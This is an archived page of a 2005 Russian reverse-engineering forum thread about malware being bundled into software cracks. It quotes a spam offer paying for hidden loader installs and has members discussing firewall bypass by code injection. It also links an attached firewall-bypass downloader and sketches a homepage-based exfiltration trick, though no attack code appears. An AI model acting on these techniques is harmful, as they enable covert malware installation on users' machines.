<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<title>Андеграунд совсем обнаглел - eXeL@B</title>
<meta NAME="DESCRIPTION" CONTENT="Во мне что по мэйлу пришло: Предлагаю нам с вами работать вместе, суть заключается в том что мы платим за инсталлы нашего софта, это делается так вебмастер размещает у себя на сайте срытый ифрэйм код, когда юзер туда заходит ему">
<meta NAME="KEYWORDS" CONTENT="x64_dbg windbg ollydbg ida скачать взлом отладчик ассемблер дизассемблер крэкер cracker реверсер keygen кейген кодер патч патчер крэкми лоадер брутфорсер протектор распаковщик пароль ключ ключфайл шпион oep key защита программа winapi faq hiew windasm softice winhex">
<META NAME="Document-state" CONTENT="Dynamic">
<META HTTP-EQUIV="Pragma" CONTENT="no-cache"> 
<link rel="SHORTCUT ICON" href="/favicon.ico">
<meta name="viewport" content="width=device-width">
<link href="./skin/s0.css" type="text/css" rel="STYLESHEET">
<link href="./skin/code.css" type="text/css" rel="STYLESHEET">
<script type="text/javascript" src="./js/jq.js"></script>
<link rel="alternate" type="application/rss+xml" title="eXeL@B" href="./rss.php">
<style type="text/css">.username div .dops{display:none;}</style>
<link href="../menu.css" type="text/css" rel="stylesheet">
</head>

<body>
<a id="to_top"></a>
<div id="wrapper">
 
<div class="mob-hamburger"><span></span></div>
 
</center></div><script type='text/javascript'>
function lst(){var i=0;var htm='';var a='';var timer=setInterval(function(){if(i<10){i=i+10;}else{clearInterval(timer);i=0;}document.getElementById('kurs_container').style.marginLeft='-'+i+'px';},100);}
document.addEventListener('DOMContentLoaded',function(event){setTimeout(lst,1500);setInterval(lst,10000);});
</script></div></div>
<script type="text/javascript">
jQuery(document).ready(function(){
    jQuery(".mob-hamburger").on("click", function() {
        jQuery(".mob-hamburger").toggleClass("active");
        jQuery("#site-navigation").slideToggle();
		if (jQuery('.mob-hamburger').hasClass('active')) {
			var i = jQuery('#site-navigation').offset().top;
		} else { 
			var i = 0;
		}
			
		jQuery("html, body").animate({ scrollTop: i }, 600);
    });
	var btn = jQuery('#to_top');
	jQuery(window).scroll(function() {
		if (jQuery(window).scrollTop() > 300) {
			btn.addClass('show');
		} else {
			btn.removeClass('show');
		}
	});
	btn.on('click', function(e) {
		e.preventDefault();
		jQuery('html, body').animate({scrollTop:0}, '300');
	});
});
</script>
 
<div id="content">
<div align=center style="margin-top:15px">

<table class=tbTransparent>
<tr><td class=tbTransparent>
<span class=txtSm>Сейчас на форуме: <b><a target='_blank' href='?action=userinfo&amp;user=52433'>Wenzel</a>, <a target='_blank' href='?action=userinfo&amp;user=42610'>r0lka</a>, <a target='_blank' href='?action=userinfo&amp;user=31053'>yashechka</a> (+5 невидимых)</b></span>
</td>
</tr>
</table>

 

</div><br>
<script language="javascript" type="text/javascript" charset="windows-1251" src="templates/base.js"></script>

<div align=center><table class=forums><tr>
<td width=16 valign=top class=caption3><img src="./img/forum_icons/red.gif" width=16 height=16 alt=""></td>
<td width="100%" class=caption3><span class=header>&nbsp;<a href="../index.html"><b>eXeL@B</b></a> <b class=bulletHead>&#8212;&#8250;</b> <a href="action=vtopic&amp;forum=2&sortBy=0&page=0.html"><b>Крэки, обсуждения</b></a> <b class=bulletHead>&#8212;&#8250;</b> Андеграунд совсем обнаглел</span></td>
</tr></table>
<table class=tbTransparent><tr><td class=tbTransparent><span class=txtSm><b> <a href="action=vthread&amp;forum=2&amp;topic=3323&amp;page=0.html">&lt;&lt;</a> .  <a href="action=vthread&amp;forum=2&amp;topic=3323&amp;page=0.html">1</a> . <b>2</b> .</b></span></td></tr></table>
<table class=forums><tr>
<td width="15%" class=caption4><span class=txtSm><b>Посл.ответ</b></span></td>
<td width="85%" class=caption4><span class=txtSm><b>Сообщение</b></span></td></tr>
<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="1" onfocus="this.blur()" href="JavaScript:di('[b]Bad_guy[/b]','')">Bad_guy</a></b><br></div>
<img src="img/s8.gif" alt=""><br><img style="padding-top:3px;" src="av/7.gif" alt=""><br><span class=txtSm>Ранг: 536.4 (<b>!</b>), 171thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.97'>Активность: 0.66<span style='color:red'>&searr;</span>0.13</span><br>Статус: <a href="action=userinfo&amp;user=7">Администратор</a><br><font color=blue>Создатель CRACKL@B</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 24 ноября 2005 12:35 <br><script type="text/javascript">QU('Bad_guy','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Bad_guy" target="_blank">Личное сообщение</a> &middot;  <a href="#1" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#1');return false;">#1</a> </span><div align=left><br>
Во мне что по мэйлу пришло:
<br>
<br>Предлагаю нам с вами работать вместе, суть заключается в том что мы платим за 
<br>инсталлы нашего софта, это делается так вебмастер размещает у себя на сайте 
<br>срытый ифрэйм код, когда юзер туда заходит ему сливается на автомате лоадер 
<br>который скрытно устанавливает наше по, в него входят тулбар, диалер и смена 
<br>хоумпаги. Так вот я предлагаю вам просто интегрировать наш лоадер(ехе файл), в 
<br>свои патчи и прочие кряки, он весит всего 4кб, и когда юзер будет запускать 
<br>ваш кряк, ему будет ставится наш софт, обычно чтоб не выдавать себя софт 
<br>активизируется через 15-30 минут... Теперь самое интересное, для работы с нами 
<br>вам необходимо зарегистрироваться на нашем сайте и сообщить об этом мне, чтоб 
<br>я вас активизировал... теперь поговорим об оплате, мы платим от 80 до 500 
<br>долларов за 1000 инсталов нашего софта.. для более подробной информации вот 
<br>мои контактные данные:
<br>ччтп://leonex.iframecash.biz/ (хз, там может быть тоже трой).
<br>icq: 238726537
<br><br><font size="1"><i>-----<br>Всем не угодишь</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43377&amp;user=7&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=1" class="addthx" data-post="43377"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr><td class=caption4 colspan=2></td></tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="2" onfocus="this.blur()" href="JavaScript:di('[b]fakit[/b]','')">fakit</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 78.3 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.08'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1986">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 13:39 <br><script type="text/javascript">QU('fakit','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=fakit" target="_blank">Личное сообщение</a> &middot;  <a href="#2" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#2');return false;">#2</a> </span><div align=left><br>
<I>arnix пишет:
<br>А что им мешает просто джойнером склеить кряк с заразой, тут уже никакая защита не поможет... </I>
<br>Так нет, на сайте тимы в описании кряка его размер и контрольная сумма.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43725&amp;user=1986&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=2" class="addthx" data-post="43725"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="3" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 13:41 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#3" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#3');return false;">#3</a> </span><div align=left><br>
<b>ASMax</b> <b>Gideon Vi</b> <b>Ms-Rem</b> не соррьтесь <img src="img/smilies/s6.gif" alt=""> А то щас будет явный оффтоп. И разведете тему кто круче <img src="img/smilies/s15.gif" alt=""> Как я уже написал при большом желании ломается/обходится всё. Но в стандартных ситуациях частенько спасает фаер подобраный с умом и настроенный как следует.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43726&amp;user=2365&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=3" class="addthx" data-post="43726"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="4" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 13:45 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#4" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#4');return false;">#4</a> </span><div align=left><br>
<b>fakit</b>
<br>Полагаешь юзвер полезет на сайт тимы чтобы сравнить контрольную сумму кряка найденого на каком нить cracks.am? <img src="img/smilies/s6.gif" alt=""> Емуб побыстрее прогу активировать и насладиться всеми прелестями... В общем пока человек сам не научится на своих ошибках ему никто ничем не поможет! Он как был ботом так и останется им.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43727&amp;user=2365&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=4" class="addthx" data-post="43727"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="5" onfocus="this.blur()" href="JavaScript:di('[b]Gideon Vi[/b]','')">Gideon Vi</a></b><br></div>
<img src="img/s9.gif" alt=""><br><img style="padding-top:3px;" src="av/2585.jpg" alt=""><br><span class=txtSm>Ранг: 1131.7 <b><u>(!!!!)</u></b>, 447thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.83'>Активность: 0.67<span style='color:red'>&searr;</span>0.2</span><br>Статус: <a href="action=userinfo&amp;user=2585">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 15:58 <br><script type="text/javascript">QU('Gideon Vi','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Gideon Vi" target="_blank">Личное сообщение</a> &middot;  <a href="#5" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#5');return false;">#5</a> </span><div align=left><br>
<b>[HEX]</b>, никто не ссорится <img src="img/smilies/s1.gif" alt=""> Я задал вопрос <b>Ms-Rem</b>, так как его квалификация в данном вопросе явно выше моей.
<br>&quot;50 строк&quot; - это, я так понимаю, чтобы выйти под маской какого-нибудь &quot;правильного&quot; приложения, типа IEXPLORE.EXE... но у того же оутпуста весьма толковый анализатор, так что куча приватных и не очень троев, до недавнего времени удачно юзавших эту возможность, теперь нервно курят. Значит, если не ломать фаер, то можно чувстовать себя в относительной безопасности...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43739&amp;user=2585&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=5" class="addthx" data-post="43739"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="6" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 16:09 <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#6" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#6');return false;">#6</a> </span><div align=left><br>
<b>Gideon Vi</b>
<br>Ну есть методы которые и не требуют изменения приложения или его компонентов. Просто нужно немного смекалки и изощерености. Так что если задаться целью затроянить цель, то почти всегда можно этого добится.
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43741&amp;user=2365&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=6" class="addthx" data-post="43741"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="7" onfocus="this.blur()" href="JavaScript:di('[b]fakit[/b]','')">fakit</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 78.3 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.08'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1986">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 16:13 <br><script type="text/javascript">QU('fakit','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=fakit" target="_blank">Личное сообщение</a> &middot;  <a href="#7" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#7');return false;">#7</a> </span><div align=left><br>
<b>[HEX]</b>
<br>я полезу, ты полезешь, еще другой десяток ;) А кто на остальных НАС_рать <img src="img/smilies/s6.gif" alt="">
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43742&amp;user=1986&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=7" class="addthx" data-post="43742"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="8" onfocus="this.blur()" href="JavaScript:di('[b]Ms-Rem[/b]','')">Ms-Rem</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/1798.gif" alt=""><br><span class=txtSm>Ранг: 120.6 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.17'>Активность: 0.09<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1798">Участник</a><br><font color=blue>rootkit developer</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 18:39 <br><script type="text/javascript">QU('Ms-Rem','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Ms-Rem" target="_blank">Личное сообщение</a> &middot;  <a href="#8" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#8');return false;">#8</a> </span><div align=left><br>
Gideon Vi
<br>
<br>Вот один из примеров закачки файла в обход фаерволла (в том числе контрольк компонентов идет лесом).
<br>Закачка идет через процесс svchost.exe который в дефолтовых правиилах фаерволлов имеет доступ по 80 порту. Этот метод используется в простеньких довнлоадерах для массовых ботов.
<br>Для установки профессионального spyware используется более прокачаная разновидность этого метода, в которой автоматически определяется имеющий доступ к http процесс, в этом случае идет лесом даже хорошо настроеный фаерволл.
<br>Самые лучшие spyware тулы используют более сложные методы обхода фаерволла (на уровне ядра), которые позволяют работать с сетью так, как будто фаерволла вобще не существует (даже если вся сетевая активность запрещена).
<br>
<br>Короче говоря,  с учетом всего вышесказаного кряки лучше всего запускать только в VmWare<br><br><img src="img/attach.gif" alt=""> <a href="./files/2103_FireFuck.asm.zip">2103_FireFuck.asm.zip</a>
<br><br><font size="1"><i>-----<br>Скажем дружно - нафиг нужно.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43764&amp;user=1798&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=8" class="addthx" data-post="43764"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="9" onfocus="this.blur()" href="JavaScript:di('[b]Druncard[/b]','')">Druncard</a></b><br></div>
<img src="img/s1.gif" alt=""><br><span class=txtSm>Ранг: 3.4 (гость)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.44'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1188">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 26 ноября 2005 21:01 <br><script type="text/javascript">QU('Druncard','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Druncard" target="_blank">Личное сообщение</a> &middot;  <a href="#9" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#9');return false;">#9</a> </span><div align=left><br>
<I>Ms-Rem пишет:
<br>кряки лучше всего запускать только в VmWare </I>
<br>Или из архивов, подписанных электронной подписью.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43774&amp;user=1188&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=9" class="addthx" data-post="43774"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="10" onfocus="this.blur()" href="JavaScript:di('[b][HEX][/b]','')">[HEX]</a></b><br></div>
<img src="img/s7.gif" alt=""><br><img style="padding-top:3px;" src="av/2365.gif" alt=""><br><span class=txtSm>Ранг: 467.7 (мудрец), 5thx<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.92'>Активность: 0.27<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2365">Участник</a><br><font color=blue>Иной :)</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 00:16 &middot; Поправил: [HEX] <br><script type="text/javascript">QU('[HEX]','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=[HEX]" target="_blank">Личное сообщение</a> &middot;  <a href="#10" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#10');return false;">#10</a> </span><div align=left><br>
Эмм... ну раз на то пошло то есть еще одна идея <img src="img/smilies/s8.gif" alt=""> личного характера...
<br>Что мешает троянцу создать файл для отправки на ружу с нужной для нас инфой + html файл закачки на определеный сервачек полезного нам файла и этот html файл выставить домашней страницей. Впринципе никаких нарушений в системен не производим... браузеру скорей всего доступ в инет разрешен... Так что в 80% ведро будет затроянено должным образом. Надеюсь эта инфа не уйдет дальше этого фрума и не проявится в виде новых троянов и прочей фигни <img src="img/smilies/s14.gif" alt="">
<br><br><font size="1"><i>-----<br>Computer Security Laboratory</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43797&amp;user=2365&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=10" class="addthx" data-post="43797"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="11" onfocus="this.blur()" href="JavaScript:di('[b]FKMA[/b]','')">FKMA</a></b><br></div>
<img src="img/s2.gif" alt=""><br><span class=txtSm>Ранг: 20.9 (новичок)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.69'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2918">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 00:28 <br><script type="text/javascript">QU('FKMA','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=FKMA" target="_blank">Личное сообщение</a> &middot;  <a href="#11" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#11');return false;">#11</a> </span><div align=left><br>
<I>Ms-Rem пишет:
<br>в которой автоматически определяется имеющий доступ к http процесс, в этом случае идет лесом даже хорошо настроеный фаерволл. </I>
<br>В нормальных файрах есть контроль использования CreateRemoteThread/WriteProcessMemory процессом. Правила из области &quot;Process attack rule&quot;. Т.е. внедрение кода в чужой процесс и запуск его контролируется. Имхо, не прокатит.
<br><I>Ms-Rem пишет:
<br>более сложные методы обхода фаерволла (на уровне ядра) </I>
<br>Если еще и вирусы в ring0 появятся, тогда вооще труба...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43798&amp;user=2918&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=11" class="addthx" data-post="43798"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="12" onfocus="this.blur()" href="JavaScript:di('[b]FKMA[/b]','')">FKMA</a></b><br></div>
<img src="img/s2.gif" alt=""><br><span class=txtSm>Ранг: 20.9 (новичок)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.69'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2918">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 00:33 <br><script type="text/javascript">QU('FKMA','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=FKMA" target="_blank">Личное сообщение</a> &middot;  <a href="#12" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#12');return false;">#12</a> </span><div align=left><br>
<I>[HEX] пишет:
<br>Что мешает троянцу создать файл для отправки на ружу с нужной для нас инфой + html файл закачки на определеный сервачек полезного нам файла </I>
<br>А как этот файл отправить ? Если через форму, то вначале кнопку Submit нажать надо. А javascript вроде отправлять файлы сам не может...
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43799&amp;user=2918&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=12" class="addthx" data-post="43799"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="13" onfocus="this.blur()" href="JavaScript:di('[b]fakit[/b]','')">fakit</a></b><br></div>
<img src="img/s4.gif" alt=""><br><span class=txtSm>Ранг: 78.3 (постоянный)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.08'>Активность: 0.03<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1986">Участник</a></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 01:07 <br><script type="text/javascript">QU('fakit','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=fakit" target="_blank">Личное сообщение</a> &middot;  <a href="#13" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#13');return false;">#13</a> </span><div align=left><br>
<I>FKMA пишет:
<br>В нормальных файрах есть контроль использования CreateRemoteThread/WriteProcessMemory процессом </I>
<br>Ага, у аутпоста 3.0 написанна такая фигня в фишка, но я не тестил.
<br><br><span class="txtGoods"><a href="action=addthx&amp;post=43800&amp;user=1986&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=13" class="addthx" data-post="43800"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel2>
<td width="17%" class=caption1>
<div class=username><div><b><a name="14" onfocus="this.blur()" href="JavaScript:di('[b]Ms-Rem[/b]','')">Ms-Rem</a></b><br></div>
<img src="img/s5.gif" alt=""><br><img style="padding-top:3px;" src="av/1798.gif" alt=""><br><span class=txtSm>Ранг: 120.6 (ветеран)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 15.17'>Активность: 0.09<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=1798">Участник</a><br><font color=blue>rootkit developer</font></span></div>
<br>
</td>
<td width="83%" class="caption1 post"><span class=txtSm>Создано: 27 ноября 2005 06:47 <br><script type="text/javascript">QU('Ms-Rem','Цитата','пишет');</script> &middot; <a href="?step=sendmsg&amp;action=pmail&amp;userto=Ms-Rem" target="_blank">Личное сообщение</a> &middot;  <a href="#14" onClick="prompt('Ссылка на сообщение', 'https://exelab.ru/f/action=vthread&amp;forum=2&amp;topic=3323&amp;page=1#14');return false;">#14</a> </span><div align=left><br>
[quote]ак что в 80% ведро будет затроянено должным образом. Надеюсь эта инфа не уйдет дальше этого фрума и не проявится в виде новых троянов и прочей фигни[/quote]
<br>Да и незачем такие извращения, все делается гораздо проще.
<br>
<br>
<br>&gt;&gt; Имхо, не прокатит.
<br>
<br>А ты сначала проверь пример из атача. В данном случае фаерволл не может контролировать WriteProcessMemory (это связано с одним из ключевых принципов работы Windows). В общем теорию этого метода я обьяснять не буду, кому надо тот и сам догадается. Единственный фаерволл которые может эту реалиацию отлавливать - это ZoneAlarm, но против него тоже можно использовать этот же метод с небольшими модификациями, естественно их приводить я тоже не буду.
<br>Короче, если кто не верит что это работает, пусть проверит сам.
<br><br><font size="1"><i>-----<br>Скажем дружно - нафиг нужно.</i></font><br><br><span class="txtGoods"><a href="action=addthx&amp;post=43811&amp;user=1798&amp;forum_n=2&amp;topic=3323&amp;page=1&amp;anchor=14" class="addthx" data-post="43811"><img src="img/tu.png" border=0 title="Полезное сообщение"></a><span class="have_thx" style="display:none"> | Сообщение посчитали полезным: <span class="total_thx"></span></span></span><br></div></td>
</tr>

<tr valign=top class=tbCel1>
<td width="17%" class=caption1>
<div class=username><div><b><a name="15" onfocus="this.blur()" href="JavaScript:di('[b]FKMA[/b]','')">FKMA</a></b><br></div>
<img src="img/s2.gif" alt=""><br><span class=txtSm>Ранг: 20.9 (новичок)<br><span title='Сообщений в день (с регистрации) / За последний год / Лет с регистрации: 14.69'>Активность: 0.01<span style='color:red'>&searr;</span>0</span><br>Статус: <a href="action=userinfo&amp;user=2918">Участник</a></span></div>
<br>
</td>
